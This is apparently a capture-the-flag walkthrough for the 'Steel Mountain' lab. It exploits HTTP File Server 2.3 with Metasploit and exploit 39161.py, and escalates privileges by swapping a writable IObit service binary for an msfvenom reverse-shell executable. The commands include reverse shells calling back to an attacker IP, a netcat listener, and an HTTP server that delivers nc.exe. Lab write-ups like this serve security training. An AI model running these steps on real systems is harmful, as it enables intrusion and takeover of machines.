# Steel Mountain

## Task2 

```bash
searchsploit http file server 2.3 
searchsploit -u <Id> 

msfconsole
> search http file server 2.3
> use 3 
> set rhosts <Target_IP>
> set rport 8080
> exploit
```

## Task3
To enumerate this machine, we will use a powershell script called PowerUp, that's purpose is to evaluate a Windows machine and determine any abnormalities - "PowerUp aims to be a clearinghouse of common Windows privilege escalation vectors that rely on misconfigurations."

We can download the script [here](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1).  If you want to download it via the command line, be careful not to download the GitHub page instead of the raw script. Now you can use the upload command in Metasploit to upload the script.

```bash
# Metasploit
>upload /tmp/PowerUp.ps1
```
To execute this using Meterpreter, I will type load powershell into meterpreter. Then I will enter powershell by entering powershell_shell:
```bash
load powershell
powershell_shell
PS > . .\PowerUp.ps1
PS > Invoke-AllChecks | Where-Object { $_.CanRestart -eq "True" }
```

The CanRestart option being true, allows us to restart a service on the system, the directory to the application is also write-able. This means we can replace the legitimate application with our malicious one, restart the service, which will run our infected program!

Use msfvenom to generate a reverse shell as an Windows executable.

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.33.201 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o ASCService.exe

```

We need the listener so put the service in background

```bash
Ctrl-z
background
use exploit/multi/handler
show options
set payload windows/shell/reverse_tcp
set LHOST <Local_IP>
set LPORT 4443
exploit -j
session -i 1
cd C:\Program Files (x86)\IObit
upload /tmp/ASCService
shell
sc stop AdvancedSystemCareService9
COPY ./ASCService.exe "Advanced SystemCare"
sc start AdvancedSystemCareService9
```

# Task4 
```bash
searchsploit -m 39161.py
```
Change local IP and the port to 9001. Then open tmux session and make three windows.

```bash
# Window 1 
python3 -m http.server 80
```

```bash
# window 2 
nc -lvnp 9001
```

```bash
# Window 3 
python2 39161.py <Target_IP> 8080
```

The window 3 need to be run twice to gain access to the system. First time it will download the nc.exe which is in our current directory. Second, it will get access to windows powershell.


